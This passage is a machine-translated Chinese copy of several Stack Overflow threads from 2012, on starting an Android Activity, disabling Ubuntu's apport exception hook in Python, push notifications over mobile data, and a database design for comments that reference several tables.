        android:name="android.support.PARENT_ACTIVITY"
        android:value="com.menu.MainActivity" />
</activity> 
```

我将此添加到`MyGame`，但它没有被调用：

```
@Override
protected void onActivityResult(int requestCode, int resultCode, Intent data) {
} 
```

--- 编辑我需要删除这一行：

```
MainActivity.this.finish(); 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-13T02:01:36.653

首先在标签中插入清单

```
<application>...</application> 
```

这个标签：

```
 <activity
        android:name=".MyGame"
        android:label="MygameName" >
    </activity> 
```

并更改您的代码：

```
 public boolean onMenuItemClicked(final MenuScene pMenuScene,
        final IMenuItem pMenuItem,
        final float pMenuItemLocalX,
        final float pMenuItemLocalY) {

switch(pMenuItem.getID()) {

case MENU_PLAY:
MainActivity.this.runOnUiThread(new Runnable() {
    public void run() {

        Intent intent = new Intent(MainActivity.this, MyGame.class);
        startActivity(intent);
        MainActivity.this.finish();

    }
});
return true; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-12T14:39:26.150

MyGame 必须是一个活动，并且必须在 Android.manifest 中作为活动提及。

[http://developer.android.com/training/basics/firstapp/starting-activity.html](http://developer.android.com/training/basics/firstapp/starting-activity.html)

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2014-08-05T12:32:59.410

请删除对函数“finish()”的调用，然后它将带您返回父活动。

# python - 如何获取 apport sys.excepthook 的根目录？

> ID：13841996
> 
> 赞同：1
> 
> 时间：2012-12-12T14:36:03.923
> 
> 标签：python, exception, ubuntu

Ubuntu 的应用`sys.excepthook`程序对我来说总是崩溃，可能是因为我在这台机器上没有 root 权限。反正对我自己的发展没用。我怎样才能摆脱它？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-12T14:48:47.007

我不知道为什么你应该在使用 Ubuntu 的 apport_excepthook 时遇到问题，但你可以通过以下方式禁用它：

```
sys.excepthook = sys.__excepthook__ 
```

# android - 3G时推送消息不来？

> ID：13841997
> 
> 赞同：1
> 
> 时间：2012-12-12T14:36:12.713
> 
> 标签：android, push-notification, 3g

我实现了推送通知系统，我注意到当我使用 3G 或 4G（移动互联网）时，推送消息永远不会出现。

当我连接到 wifi 时，它们会定期出现。

这种行为是否与 Android 操作系统绑定，或者我们可以编写代码来更改它？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T18:37:44.817

> 我实现了 Parse.com 3rd 方库。不管我自己，我注意到除非我连接到 wifi，否则来自其他应用程序的推送消息不会出现。

如果您在来自 Google 的内容（Gmail、Google Play 应用更新等）上看到相同的行为，那么问题出在您的手机或运营商上。如果谷歌的东西有效（他们使用相当于 GCM 的东西），那么你的问题在于 Parse.com 以及其他应用程序用于推送的任何东西。

GCM（和 C2DM 前身）通过移动数据或 WiFi 工作。将推送系统实现为第三方库有点棘手，这就是为什么我推荐固件解决方案（GCM、亚马逊刚刚宣布的 Kindle Fire 等价物等）的原因。特别是，保持与推送服务器的移动数据连接，有足够的心跳来保持连接有效而不会真正耗尽电池，很难做到正确，特别是考虑到移动运营商或设备的细微变化。谷歌在这方面的经验比大多数公司都多，亚马逊只需要担心少数 Kindle Fire 型号。

# database - 数据库映射 - 多个外键

> ID：13841998
> 
> 赞同：2
> 
> 时间：2012-12-12T14:36:19.813
> 
> 标签：database, database-design, data-modeling

我想确保这是处理特定场景的最佳方式。

假设我有三个主表，我将保持它们的通用性。它们都有主键，它们都是独立的表，没有任何引用。

**表格1**

```
PK
VarChar Data 
```

**表 2**

```
PK
VarChar Data 
```

**表3**

```
PK
VarChar Data 
```

这是场景，我希望用户能够评论上述每个表上的特定行。但我不想创建一堆评论表。所以到目前为止我是这样处理的..

有一个注释表，其中包含三个外键列，每个列引用上面的主表。有一个约束，只能对这些列中的一个列进行赋值。

**评论表**

```
PK 
FK to Table1
FK to Table2
FK to Table3
VarChar Comment
FK to Users 
```

我的问题：这是处理这种情况的最佳方式吗？是否存在通用外键？或者我应该为每个主表有一个单独的评论表..即使数据结构完全相同？或者每个人的映射表会是更好的解决方案吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-12T17:37:31.400

> 我的问题：这是处理这种情况的最佳方式吗？

带有 CHECK 的多个 FK 只允许其中一个为非 NULL 是一种合理的方法，尤其是对于这种情况下相对较少的表。

另一种方法是`Table 1, 2 and 3`从一个公共的“父”表“继承”，然后将评论连接到父表。

[在这里](https://stackoverflow.com/a/13317463/533120)和[这里](https://stackoverflow.com/a/8113064/533120)查看更多信息。

> 是否存在通用外键？

如果您的意思是可以从一个表“跳”到另一个表的 FK，那么不。

假设所有 3 个 FK 的类型相同¹，理论上您可以通过保留外键值和引用的表名²来实现类似的东西，然后通过触发器强制执行它，但声明性约束应该优先于它，即使价格为存储空间略大。

*如果*您的 DBMS 完全支持“虚拟”或“计算”列，那么您可以执行与上述类似的操作，但无需触发器，而是根据 FK 值和表名生成 3 个计算列。在任何给定时间，这些计算列中只有一个是非 NULL 的，您可以对它们使用“正常”FK，就像对物理列一样。

但是，当有许多“可连接”表并且您的 DBMS 在存储 NULL 时并不节俭时，所有这些都是有意义的。当它们只有 3 个时或什至还有更多时，几乎没有什么好处，但您的 DBMS 在每个 NULL 字段上只花费一位。

> 或者我应该为每个主表有一个单独的注释表，即使数据结构完全相同？

“数据结构”并不是唯一重要的事情。*如果*您碰巧有不同的**约束**（例如，适用于其中一个但不适用于另一个的 FK），即使列相同，也需要单独的表。

但是，我猜这不是这里的情况。

> 或者每个人的映射表会是更好的解决方案吗？

我不确定您所说的“映射表”是什么意思，但是您可以执行以下操作：

![在此处输入图像描述](../Images/e7cb43940b2c1bcaf22ee59b974d809e.png)

不幸的是，这将允许单个评论连接到多个表（或根本没有表），这本身就是对您已有的内容的复杂化。

总而言之，您的原始解决方案可能很好。

* * *

*¹或者您愿意将其存储为字符串并接受转换，您应该不愿意这样做。*

*²在实践中，这实际上不是一个名称（如字符串）——它将是一个整数（或枚举，如果 DBMS 支持它），其中一个众所周知的预定义值标识该表。*

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-13T20:04:10.350

感谢所有帮助的人，我能够在我的同事的帮助下制定解决方案。我决定只使用一个，而不是多个映射表。

该映射表包含一组注释，因此它没有主键。每个组行链接回评论。因此，您可以拥有多个相同的组 ID。一对多的关系。

![数据库组表概念](../Images/2b90c5a4c844a4e45449ea132ae6db8c.png)